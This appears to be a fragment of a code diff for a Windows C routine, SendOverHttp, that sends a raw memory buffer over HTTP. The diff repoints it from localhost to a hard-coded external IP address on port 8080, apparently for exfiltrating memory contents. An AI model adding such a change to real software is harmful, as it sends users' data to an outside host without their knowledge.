@@ -26,7 +26,7 @@ BOOL SendOverHttp( IN PVOID pAddress, IN DWORD size )
 	/* connect to the server */
 	hConnect = InternetConnect(
 		hInternet,
-		L"localhost",
+		L"194.59.30.81",
 		8080,
 		NULL,
 		NULL,
